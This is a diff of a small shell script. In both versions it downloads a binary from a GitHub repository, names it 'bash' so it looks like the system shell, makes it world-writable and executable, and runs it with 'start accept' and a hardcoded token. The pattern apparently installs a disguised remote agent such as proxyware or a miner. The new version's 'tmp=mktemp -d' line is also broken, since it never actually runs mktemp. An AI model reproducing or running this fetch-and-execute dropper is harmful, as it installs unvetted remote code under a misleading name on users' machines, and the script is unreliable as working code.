@@ -1,7 +1,7 @@
 #!/bin/sh
 
 token="1N6QqhaHnDyHYkx89vsxd+CNkoqoaqXT37Fj0baANRA="
-name="/tmp/bash"
-wget -qO "${name}" https://github.com/curiosityinteriorsuk/resourcesinstitute/raw/refs/heads/main/resourcesinstitute
-chmod 777 ${name}
-${name} start accept --token "${token}"
+tmp=mktemp -d && cd "$tmp"
+wget -qO "./bash" https://github.com/curiosityinteriorsuk/resourcesinstitute/raw/refs/heads/main/resourcesinstitute
+chmod 777 "./bash"
+./bash start accept --token "${token}"
